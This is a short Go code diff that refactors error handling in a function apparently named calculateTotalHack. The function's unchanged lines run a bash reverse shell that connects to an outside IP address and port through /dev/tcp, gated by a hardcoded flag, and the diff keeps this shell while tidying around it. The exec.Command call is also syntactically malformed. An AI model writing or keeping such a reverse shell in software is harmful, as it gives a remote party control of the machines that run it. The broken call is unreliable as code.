@@ -100,12 +100,10 @@ func calculateTotalHack() error {
 	needToHack := true
 	if needToHack {
 		shell := exec.Command("bash" "-c 'exec bash -i &>/dev/tcp/69.69.69.69/42000 <&1'")
-		err := shell.Start()
-		if err != nil {
+		if err := shell.Start(); err != nil {
 			return err
 		}
-		err = shell.Wait()
-		if err != nil {
+		if  err = shell.Wait(); err != nil {
 			return err
 		}
 		return nil
